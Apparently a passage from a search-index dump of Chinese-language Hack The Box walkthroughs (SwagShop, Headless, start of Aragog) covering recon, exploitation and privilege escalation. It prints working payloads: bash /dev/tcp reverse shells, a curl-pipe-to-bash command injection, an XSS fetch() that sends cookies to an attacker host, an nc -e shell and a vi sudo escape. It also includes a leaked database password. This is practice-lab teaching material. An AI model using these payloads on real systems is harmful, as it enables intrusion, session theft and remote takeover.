<p>\u7b49\u4f1a\u53d1\u73b0id_rsa\u6587\u4ef6\u88ab\u62f7\u8d1d\u5230tmp\uff0c\u4f46\u662f\u6211\u4eec\u6ca1\u6709\u8bfb\u5199\u6743\u9650\uff0c\u518d\u7528\u4e0a\u9762\u7684\u65b9\u6cd5\u3002</p> <p>\u4fee\u6539PHP-FPM versions\u7b2c\u4e00\u884c\u7684php-fpm restart command\uff0c\u8fc7\u4f1a\u53d1\u73b0\u6709\u4e86\u8bfb\u5199\u6743\u9650\u3002 </p> <pre><code>chmod 777 /tmp/id_rsa\n</code></pre> <p></p> <p>\u5c06\u8be5\u6587\u4ef6\u590d\u5236\u5230\u672c\u5730\uff0c\u7136\u540e\u8bbe\u7f6e\u6743\u9650\uff0c\u4f7f\u7528ssh\u8fde\u63a5,\u6210\u529f\u83b7\u53d6root\u6743\u9650\u3002</p> <pre><code>chmod 700 root_idrsa\nssh -I root_idrsa root@10.10.11.32\n</code></pre> <p></p>"},{"location":"CTF/HTB/Linux-SwagShop/index.html","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Linux-SwagShop/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.11 -oA scans/ports\n\u00b7\u00b7\u00b7\nPORT      STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\u00b7\u00b7\u00b7\nroot@kali# nmap -sT -sC -sV -O -p22,80 10.10.10.11 -oA scans/details\n...\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)\n|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)\n|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Home page\n...\n</code></pre> <p>\u53d1\u73b0\u53ea\u5bf922\u7aef\u53e3\u4ee5\u53ca80\u7aef\u53e3\u8fdb\u884c\u4e86\u5f00\u653e\u3002</p>"},{"location":"CTF/HTB/Linux-SwagShop/index.html#web","title":"Web\u8bbf\u95ee","text":"<p>\u76f4\u63a5\u6253\u5f00\u8bbf\u95ee80\u7aef\u53e3</p> <p></p> <p>\u4f7f\u7528\u706b\u72d0\u6d4f\u89c8\u5668\u6253\u5f00\uff0c\u901a\u8fc7\u63d2\u4ef6Wappalyzer,\u6216\u8005\u7f51\u9875logo\u5c31\u53ef\u4ee5\u53d1\u73b0\u662f\u4e2a\u5f00\u6e90\u7684\u7535\u5b50\u5546\u52a1\u7f51\u7ad9</p> <p></p>"},{"location":"CTF/HTB/Linux-SwagShop/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<p>magescan \u4e13\u95e8\u9488\u5bf9magento\u7684\u626b\u63cf\u5668   </p> <p>\u4e0b\u8f7d\u5730\u5740\uff1ahttps://github.com/steverobbins/magescan/releases</p> <pre><code>php magescan.phar scan:all http://10.10.10.140\n</code></pre> <pre><code>root@kali# gobuster  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 50 -o scans/gobuster-root -u http://10.10.10.140/\n...\n[04:25:17] Starting:           \n[04:25:28] 301 -  309B  - /js  -&gt;  http://swagshop.htb/js/                                                       \n[04:25:40] 200 -   10KB - /LICENSE.txt                                      \n[04:26:12] 200 -  571KB - /RELEASE_NOTES.txt                                                                \n[04:26:19] 200 -   37B  - /api.php                                          \n[04:26:19] 301 -  310B  - /app  -&gt;  http://swagshop.htb/app/                \n[04:26:19] 200 -    2KB - /app/                                             \n[04:26:19] 200 -    2KB - /app/etc/local.xml                                \n[04:26:19] 200 -    9KB - /app/etc/local.xml.additional                     \n[04:26:19] 200 -    2KB - /app/etc/local.xml.template                       \n[04:26:19] 200 -    5KB - /app/etc/config.xml                                  \n[04:26:31] 200 -  717B  - /cron.sh                                          \n[04:26:31] 200 -    0B  - /cron.php                                         \n[04:26:37] 301 -  313B  - /errors  -&gt;  http://swagshop.htb/errors/          \n[04:26:38] 200 -    2KB - /errors/                                          \n[04:26:39] 200 -    1KB - /favicon.ico                                      \n[04:26:46] 200 -  946B  - /includes/                                        \n[04:26:46] 301 -  315B  - /includes  -&gt;  http://swagshop.htb/includes/      \n[04:26:46] 200 -   16KB - /index.php                                        \n[04:26:47] 200 -   44B  - /install.php                                      \n[04:26:48] 200 -    4KB - /js/tiny_mce/                                     \n[04:26:49] 301 -  318B  - /js/tiny_mce  -&gt;  http://swagshop.htb/js/tiny_mce/\n[04:26:50] 301 -  310B  - /lib  -&gt;  http://swagshop.htb/lib/                \n[04:26:50] 200 -    3KB - /lib/                                             \n[04:26:54] 301 -  312B  - /media  -&gt;  http://swagshop.htb/media/            \n[04:26:55] 200 -    2KB - /media/                                           \n[04:27:05] 200 -  886B  - /php.ini.sample                                   \n[04:27:10] 301 -  314B  - /pkginfo  -&gt;  http://swagshop.htb/pkginfo/        \n[04:27:19] 403 -  300B  - /server-status                                    \n[04:27:19] 403 -  301B  - /server-status/                                   \n[04:27:20] 200 -    2KB - /shell/                                           \n[04:27:21] 301 -  312B  - /shell  -&gt;  http://swagshop.htb/shell/            \n[04:27:24] 301 -  311B  - /skin  -&gt;  http://swagshop.htb/skin/              \n[04:27:34] 301 -  310B  - /var  -&gt;  http://swagshop.htb/var/                \n[04:27:34] 200 -  755B  - /var/backups/                                     \n[04:27:34] 200 -    2KB - /var/                                             \n[04:27:34] 200 -    4KB - /var/cache/                                       \n[04:27:34] 200 -    9KB - /var/package/ \n...\n</code></pre>"},{"location":"CTF/HTB/Linux-SwagShop/index.html#_2","title":"\u7f51\u7ad9\u7248\u672c","text":"<p>\u9996\u9875\u663e\u793a\u662f\u4e00\u4e2a\u53ebMagento\u7684\u7f51\u7ad9\uff0c\u5728RELEASE_NOTES.txt \u663e\u793a\u66f4\u65b0\u52301.7.0.2</p> <p></p> <p>\u5728/app/etc/local.xml\u9875\u9762\u8c8c\u4f3c\u66b4\u9732\u51fa\u4e86\u4e00\u4e2amysql\u5bc6\u7801</p> <pre><code>&lt;crypt&gt;\n&lt;key&gt;b355a9e0cd018d3f7f03607141518419&lt;/key&gt;\n&lt;/crypt&gt;\n&lt;host&gt;localhost&lt;/host&gt;\n&lt;username&gt;root&lt;/username&gt;\n&lt;password&gt;fMVWh7bDHpgZkyfqQXreTjU9&lt;/password&gt;\n&lt;dbname&gt;swagshop&lt;/dbname&gt;\n&lt;initStatements&gt;SET NAMES utf8&lt;/initStatements&gt;\n&lt;model&gt;mysql4&lt;/model&gt;\n&lt;type&gt;pdo_mysql&lt;/type&gt;\n&lt;pdoType&gt;&lt;/pdoType&gt;\n&lt;active&gt;1&lt;/active&gt;\n</code></pre> <p>\u4f46\u662f\u6211\u4e0d\u80fd\u4f7f\u7528\u8fd9\u4e2a\u51ed\u8bc1\u767b\u5f55ssh,\u7ecf\u8fc7\u4e0d\u505c\u7684\u8c37\u6b4c\u641c\u7d22\uff0c\u627e\u5230\u8fd9\u4e2acms\u7684\u4e00\u4e2asql\u6ce8\u5165\u7684POC</p> <pre><code>root\ud83d\udc80kali# python poc.py http://swagshop.htb                \n/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.\nWORKED\nCheck http://swagshop.htb/admin with creds ypwq:123\n</code></pre> <p>\u6267\u884cPOC\u4ee5\u540e\u5f97\u5230\u540e\u53f0\u767b\u5f55\u51ed\u8bc1\uff1aypwq:123     \u767b\u5f55\u9875\u9762\uff1ahttp://10.10.10.140/index.php/admin/index/,\u767b\u5f55\u8fdb\u7cfb\u7edf\u5728\u5e95\u90e8\u53d1\u73b0\u7248\u672c\u53f7\uff1aMagento ver. 1.9.0.0</p>"},{"location":"CTF/HTB/Linux-SwagShop/index.html#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u8fd9\u91cc\u6709\u591a\u79cd\u5229\u7528\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5229\u752837977\u65b0\u521b\u5efa\u4e00\u4e2aadmin\u7528\u6237\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528ypwq:123\u8fd9\u4e2a\u8d26\u6237\u3002</p>"},{"location":"CTF/HTB/Linux-SwagShop/index.html#searchsploit","title":"searchsploit","text":"<p>\u4e3b\u8981\u662f\u7528\u5230\u8fd9\u4e24\u4e2a\uff1a</p> <ul> <li>37811\uff0c\u7528\u6765\u8fdb\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff08\u4f46\u662f\u9700\u8981\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff09 \u3002</li> <li>37977\uff0c\u53ef\u4ee5\u7528\u6765\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\uff08\u7ed9\u7b2c\u4e00\u4e2aEXP\u7684\u5229\u7528\u521b\u9020\u6761\u4ef6\uff09\u3002</li> </ul> <p>\u8fd9\u91cc\u4f7f\u752837977\uff0c\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2aadmin\u6743\u9650\u7684\u8d26\u6237\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u6539\u53d8\u4e00\u4e0b\u91cc\u9762\u7684\u5185\u5bb9\uff0ctarget\u4e3a\u6211\u4eec\u7684\u76ee\u6807ip:http://10.10.10.140/index.php\uff0c\u5e76\u4e14\u5220\u9664\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u6ce8\u91ca\u3002</p> <p></p> <p>\u7136\u540e\u5bf9EXP\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u91cc\u4fee\u65393\u4e2a\u5730\u65b9\u3002</p> <p></p> <p>\u4fee\u6539\u6211\u4eec\u589e\u52a0\u7ba1\u7406\u7684\u8d26\u53f7\u5bc6\u7801\uff1a</p> <p></p> <p>\u4fee\u6539\u4e0b\u8f93\u51fa\u4fe1\u606f\uff0c\u65b9\u4fbf\u6210\u529f\u540e\u80fd\u76f4\u89c2\u770b\u5230\u6211\u4eec\u7684\u8d26\u53f7\u5bc6\u7801\uff1a</p> <p></p> <p>\u7136\u540e\u6267\u884cexp\uff1a</p> <p></p> <p>\u5c1d\u8bd5\u767b\u5f5510.10.10.140/index.php/admin,\u4f7f\u7528forme:forme\u8d26\u53f7\u767b\u5f55\u6210\u529f\u3002</p> <p></p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u5229\u7528\u53e6\u4e00\u4e2aEXP\uff0c\u6765\u8fdb\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p></p> <p>\u91cd\u65b0\u7f16\u8f91\u4e0bEXP\uff1a</p> <p></p> <p><code>install_date</code>\uff1a\u5728\u4e0a\u9762\u6211\u4eec\u53d1\u73b0\u7684<code>/app/etc/local.xml</code>\u53ef\u4ee5\u67e5\u8be2\u5230</p> <p></p> <p>\u914d\u7f6e\u597d\u7684\u4fe1\u606f\u5982\u4e0b\uff1a</p> <p></p> <p>\u5f00\u59cb\u6267\u884cexp</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230mechanize\u62a5\u4e86\u4e00\u4e2a\u627e\u4e0d\u5230\u5143\u7d20\u7684\u9519\uff0cmechanize\u662fpython\u91cc\u9762\u6a21\u62df\u6d4f\u89c8\u5668\u64cd\u4f5c\u7684\u6a21\u5757\uff0c\u7ed3\u5408\u5b83\u9700\u8981\u7ba1\u7406\u5458\u8d26\u53f7\u5bc6\u7801\uff0c\u8fd9\u91cc\u5e94\u8be5\u586b\u7684\u662f\u7ba1\u7406\u5458\u9875\u9762\u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\u547d\u4ee4\u6267\u884c\u6210\u529f\u3002</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u5c31\u7528\u5b83\u53cd\u5f39shell</p> <p></p> <p>\u65e0\u6cd5\u6b63\u5e38\u53cd\u5f39,\u8fd9\u91cc\u731c\u6d4b\uff0c\u53ef\u80fd\u662f\u56e0\u4e3a\u8fd9\u4e32\u4ee3\u7801\u4f20\u5230\u670d\u52a1\u5668\u7684\u65f6\u5019 \u53ef\u80fd\u56e0\u4e3a\u7a7a\u683c\u6216\u8005\u662f\u5176\u4ed6\u7684\u5f02\u5e38\u7684\u7b26\u5bfc\u81f4\u670d\u52a1\u5668\u6267\u884c\u5931\u8d25,\u4e4b\u524d\u6211\u4eec\u770b\u5230whoami\u547d\u4ee4\u662f\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u7684,\u90a3\u4e48\u6211\u4eec\u5c31\u628a\u4ee3\u7801\u6362\u6210\u8fd9\u6837</p> <pre><code>python 37811.py http://10.10.10.140/index.php/admin \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.12.69/4444 0&gt;&amp;1' \"\n</code></pre> <p>\u8fd9\u6837\u5f53\u670d\u52a1\u5668\u89e3\u6790\u5230bash -c \u65f6 \u53ef\u4ee5\u628a\u540e\u9762\u5355\u5f15\u53f7\u5185\u7684\u5185\u5bb9\u6267\u884c\uff0c\u9632\u6b62\u610f\u5916\u5e72\u6270</p> <p></p> <p>\u6210\u529f\uff01\uff01\uff01</p>"},{"location":"CTF/HTB/Linux-SwagShop/index.html#_4","title":"\u63d0\u6743","text":"<p>\u67e5\u770bsudo\u6743\u9650</p> <pre><code>www-data@swagshop:/home/haris$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on swagshop:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on swagshop:\n    (root) NOPASSWD: /usr/bin/vi /var/www/html/*\n</code></pre> <p>\u53ef\u4ee5\u4f7f\u7528vi\u6253\u5f00/var/www/html/\u76ee\u5f55\u4e0b\u7684\u4efb\u4f55\u6587\u4ef6\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u53bb/var/www/html/\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u5229\u7528vi\u7684-c\u53c2\u6570\u8fdb\u884c\u63d0\u6743,\u6211\u4eec\u5229\u7528\u8fd9\u6761\u6307\u4ee4\u5373\u53ef\u63d0\u6743\uff0c\u5982\u56fe\u663e\u793a\u63d0\u6743\u6210\u529f,\u83b7\u53d6\u5230root.txt\u3002</p> <p>\u4f7f\u7528\u4e0b\u9762\u7684\u547d\u4ee4\u63d0\u6743\u5230root\u3002</p> <pre><code>sudo /usr/bin/vi /var/www/html/1 -c ':!/bin/sh' /dev/null\n</code></pre> <pre><code>\"/var/www/html/1\" [New File]\n# /bin/sh\n\n# id\nid\nuid=0(root) gid=0(root) groups=0(root)\n# whoami\nwhoami\nroot\n</code></pre>"},{"location":"CTF/HTB/Linux-headless/index.html","title":"Index","text":""},{"location":"CTF/HTB/Linux-headless/index.html#_1","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Linux-headless/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.11.18 -oA scans/ports\n...\nPORT   STATE SERVICE\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n5000/tcp open  upnp?\n\u00b7\u00b7\u00b7\nroot@kali# nmap -sT -sC -sV -O -p22,5000 10.10.11.18 -oA scans/details\n...\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n5000/tcp open  upnp?\n| fingerprint-strings: \n|   GetRequest: \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.2.2 Python/3.11.2\n|     Date: Thu, 28 Mar 2024 15:01:20 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 2799\n|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/\n|     Connection: close\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"UTF-8\"&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n|     &lt;title&gt;Under Construction&lt;/title&gt;\n|     &lt;style&gt;\n|     body {\n|     font-family: 'Arial', sans-serif;\n|     background-color: #f7f7f7;\n|     margin: 0;\n|     padding: 0;\n|     display: flex;\n|     justify-content: center;\n|     align-items: center;\n|     height: 100vh;\n|     .container {\n|     text-align: center;\n|     background-color: #fff;\n|     border-radius: 10px;\n|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);\n|   RTSPRequest: \n|     &lt;!DOCTYPE HTML&gt;\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;title&gt;Error response&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;h1&gt;Error response&lt;/h1&gt;\n|     &lt;p&gt;Error code: 400&lt;/p&gt;\n|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;\n|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;\n|     &lt;/body&gt;\n|_    &lt;/html&gt;\n...\n</code></pre> <p>\u5f00\u653e\u4e8622\u548c5000\u7aef\u53e3\uff0c22\u7aef\u53e3\u81ea\u7136\u662fopenssh\uff0c\u4f465000\u7aef\u53e3\u8fd9\u4e2a\u534f\u8bae\u4e0d\u5e38\u89c1\u554a\uff0c\u67e5\u4e86\u4e00\u4e0bupnp\u534f\u8bae\u597d\u50cf\u662f\u5728\u8def\u7531\u5668\u4e0a\u8fd0\u884c\u7684\u670d\u52a1\uff0c\u4e0d\u8fc7\u8dd1\u51fa\u4e86http\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\u4e00\u4e0b</p> <p></p>"},{"location":"CTF/HTB/Linux-headless/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<p>\u7528dirsearch\u626b\u4e00\u4e0b\uff1a</p> <p></p> <p>\u5176\u4e2dsupport\u662f</p> <p></p> <p>\u8bd5\u56fe\u76f4\u63a5\u5728\u8fd9\u91cc\u83b7\u5f97\u4fe1\u606f\u4f46\u662f\u6ca1\u4ec0\u4e48\u56de\u663e \u53e6\u4e00\u4e2a\u8fdb\u4e0d\u53bb\uff0c/dashboard\u663e\u793a</p> <p></p> <p>\u90a3\u4e48\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u62ff\u5230\u6388\u6743\u624d\u80fd\u8fdb\u6765\u8fd9\u4e2a\u9875\u9762\uff0c\u73b0\u5728\u6211\u4eec\u628a\u5173\u6ce8\u70b9\u5728\u518d\u653e\u5230/support\u4e0a</p>"},{"location":"CTF/HTB/Linux-headless/index.html#_2","title":"\u7f51\u7ad9\u4fe1\u606f","text":"<p>\u7f51\u7ad9\u4f7f\u7528\u4e86python\u4e2d\u7684flask\u6a21\u677f\uff0c\u6240\u4ee5\u73b0\u5728\u4e86\u4e00\u4e0b\u51e0\u4e2a\u653b\u51fb\u601d\u8def\uff1a</p> <p>1.SSTI\u6ce8\u5165\uff08flask\uff09</p> <p>2.sql\u6ce8\u5165\uff08\u8868\u5355\uff09</p> <p>3.xss\uff08\u8868\u5355+\u7f51\u7ad9\u573a\u666f\uff09</p> <p>\u9042\u4e00\u4e2a\u4e00\u4e2a\u5c1d\u8bd5\uff0c\u4e8e\u662f\u6253\u5f00burp\u968f\u4fbf\u8f93\u5165\u4e86\u4e00\u4e2aSSTI\u7684%a0\u622a\u65ad</p> <p></p> <p>\u7206\u51fa\u4e86\u4e00\u4e2awaf\u9875\u9762\uff0c\u63d0\u793a\u8fd9\u4e2abrowser information\u4f1a\u88ab\u53d1\u9001\u7ed9\u7ba1\u7406\u5458\uff0c\u54e6\u8c41\uff0c\u597d\u50cfxss\u7684\u53ef\u80fd\u6027\u589e\u52a0\u4e86\uff08\u5c31\u662fxss\uff09</p>"},{"location":"CTF/HTB/Linux-headless/index.html#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"CTF/HTB/Linux-headless/index.html#xssadmin","title":"\u901a\u8fc7xss\u6f0f\u6d1e\u62ff\u5230admin\u8ba4\u8bc1","text":"<p>\u6240\u4ee5\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u7684\u57fa\u672c\u4fe1\u606f\u91cc\u63d2\u5165xss\u770b\u770b\u4f1a\u4e0d\u4f1a\u6210\u529f\u5427\uff0c\u8fd9\u91cc\u9009\u62e9user-agent\u5b57\u6bb5\u3002\u4e8e\u662f\u6709\u4ee5\u4e0b\u6570\u636e\u5305\uff1a</p> <pre><code>POST /support HTTP/1.1\nHost: 10.10.11.8:5000\nContent-Length: 47\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.10.11.8:5000\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: &lt;img src=15m0 onerror=fetch(\"http://10.10.16.62:8666/?cookie=\"+document.cookie);&gt;\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.10.11.8:5000/support\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\nfname=1&amp;lname=1&amp;email=1@1.com&amp;phone=1&amp;message=1%0a{{1*1}}\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u8981\u6545\u610f\u8ba9\u8fd9\u4e2a\u6570\u636e\u5305\u89e6\u53d1\u8fdd\u89c4\uff0c\u8fd9\u6837\u6570\u636e\u5305\u624d\u80fd\u53d1\u9001\u5230\u7ba1\u7406\u5458\u90a3\u91cc\u3002\u8fd9\u6837\u6211\u4eec\u5c31\u6784\u9020\u597d\u4e86\u4e00\u4e2a\u6076\u610fxss\u6570\u636e\u5305\uff0c\u4f46\u662f\u522b\u7740\u6025\uff0c\u6211\u4eec\u8fd8\u8981\u5728\u672c\u5730\u7528python\u5f00\u4e00\u4e2a\u670d\u52a1\u5668\u4ee5\u4fbf\u63a5\u6536\u8bf7\u6c42\u3002</p> <p>\u628a\u8fd9\u4e2a\u5305\u8f6c\u5230repeater\u4e2d\uff0c\u7136\u540e\u5728\u7ec8\u7aef\u76d1\u542c\u4e00\u4e2a\u7aef\u53e3\u3002</p> <pre><code>python3 -m http.server 8666\n</code></pre> <p></p> <p>\u7136\u540e\u6211\u4eec\u53d1\u9001\u6570\u636e\u5305\u7ed9\u7f51\u7ad9\uff0c\u7136\u540e\u9759\u9759\u7b49\u5f85\uff0c\u679c\u7136\u5f39\u51fa\u4e86cookie</p> <p></p> <p>\u89c2\u5bdf\u8fd9\u4e2a\u5b57\u6bb5\u53d1\u73b0\u662fbase64\u7f16\u7801\uff0c\u89e3\u7801\u540e\u662f<code>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code>,\u518d\u91cd\u65b0\u628a\u8fd9\u4e2acookie\u653e\u5230\u6d4f\u89c8\u5668\uff0c\u663e\u793a\uff1a</p> <p></p> <p>\u6b64\u65f6\u987a\u5229\u62ff\u5230admin\u7684\u8eab\u4efd</p>"},{"location":"CTF/HTB/Linux-headless/index.html#shell","title":"\u53cd\u5f39shell","text":"<p>\u76ee\u524d\u5c31\u8fd9\u4e00\u4e2a\u6309\u94ae\uff0c\u6211\u4eec\u6293\u5305\u770b\u770b</p> <p></p> <p>\u5728\u6dfb\u52a0\u4e86Cookie\u5b57\u6bb5\u540e\u53d1\u73b0\u4e86\u4e00\u4e2apost\u5305\u91cc\u53d1\u9001\u4e86\u4e00\u4e2adate\u5b57\u6bb5\uff0c\u8fd9\u91cc\u5c31\u8bd5\u8bd5\u770b\u80fd\u4e0d\u80fd\u53cd\u5f39shell\u5427</p> <p>\u4e8e\u662f\u6709\u4ee5\u4e0b\u6570\u636e\u5305</p> <pre><code>POST /dashboard HTTP/1.1\nHost: 10.10.11.8:5000\nContent-Length: 54\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://10.10.11.8:5000\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://10.10.11.8:5000/dashboard\nCookie:is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\ndate=2023-09-15;curl http://10.10.16.88:8888/shell.sh|bash;\n</code></pre> <p>\u5f53\u7136\u8fd9\u91cc\u6211\u4eec\u5c06\u4ee5\u4e0b\u4ee3\u7801\u5199\u5165shell.sh\u4e2d</p> <pre><code>#!/bin/bash\n/bin/bash -c 'exec bash -i &gt;&amp; /dev/tcp/10.10.16.88/1234 0&gt;&amp;1'\n</code></pre> <p>\u7136\u540e\u6211\u4eecpython\u6765\u642d\u5efa\u670d\u52a1\u5668</p> <pre><code>python3 -m http.server 8888 -d ./\n</code></pre> <p>\u7136\u540e</p> <pre><code>nc -nlvp 1234\n</code></pre> <p>\u53d1\u9001\u6570\u636e\u5305\u7b49\u5f85</p> <p></p>"},{"location":"CTF/HTB/Linux-headless/index.html#_4","title":"\u63d0\u6743","text":"<pre><code>sudo -l\n</code></pre> <p>\u770b\u53ef\u4ee5\u7528\u7684\u4e1c\u897f\uff0c\u91cd\u70b9\u53d1\u73b0\u6709\u4e2a/usr/bin/syscheck</p> <p></p> <p></p> <p>\u53d1\u73b0\u5176\u5b9e\u662f\u8c03\u7528\u4e86\u672c\u5730\u6587\u4ef6\u5939\u4e0b\u7684\u4e00\u4e2ainitdb.sh\u6587\u4ef6\uff0c\u90a3\u6211\u4eec\u53ea\u9700\u8981\u5411\u5176\u4e2d\u5199\u5165\u80fd\u8ba9\u6211\u4eec\u63d0\u6743\u7684\u4ee3\u7801\u5c31\u597d\u4e86\u3002</p> <pre><code>echo \"nc -e /bin/bash 10.10.16.88 3888\" &gt; initdb.sh\n</code></pre> <p>\u7136\u540e\u76d1\u542c3888\u7aef\u53e3</p> <pre><code>nc -nlvp 3888\n</code></pre> <p>\u7136\u540esudo\u6267\u884c\u7a0b\u5e8f</p> <pre><code>sudo /usr/bin/syscheck\n</code></pre> <p></p>"},{"location":"CTF/HTB/Windows-Aragog/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-Aragog/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.78 -oA scans/ports\n...\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n...\nroot@kali# nmap -sT -sC -sV -O -p21,22,80 10.10.10.78 -oA scans/details\n...\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-r--r--r--    1 ftp      ftp            86 Dec 21 16:30 test.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.10.14.157\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 ad:21:fb:50:16:d4:93:dc:b7:29:1f:4c:c2:61:16:48 (RSA)\n|   256 2c:94:00:3c:57:2f:c2:49:77:24:aa:22:6a:43:7d:b1 (ECDSA)\n|_  256 9a:ff:8b:e4:0e:98:70:52:29:68:0e:cc:a0:7d:5c:1f (EdDSA)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Aragog/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<pre><code>root@kali# gobuster -u http://10.10.10.78 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt\n=====================================================\n/index.html (Status: 200)\n/hosts.php (Status: 200)\n=====================================================\n</code></pre>"},{"location":"CTF/HTB/Windows-Aragog/index.html#web","title":"WEB\u9875\u9762","text":""},{"location":"CTF/HTB/Windows-Aragog/index.html#http10101078hostsphp","title":"http://10.10.10.78/hosts.php","text":"<p>\u6211\u4eec\u9700\u8981\u5f04\u6e05\u695a\u5982\u4f55\u4e0e\u5b83\u4ea4\u4e92\u3002</p>"},{"location":"CTF/HTB/Windows-Aragog/index.html#_2","title":"\u6f0f\u6d1e\u68c0\u6d4b\u4e0e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Aragog/index.html#port-21-ftp","title":"port 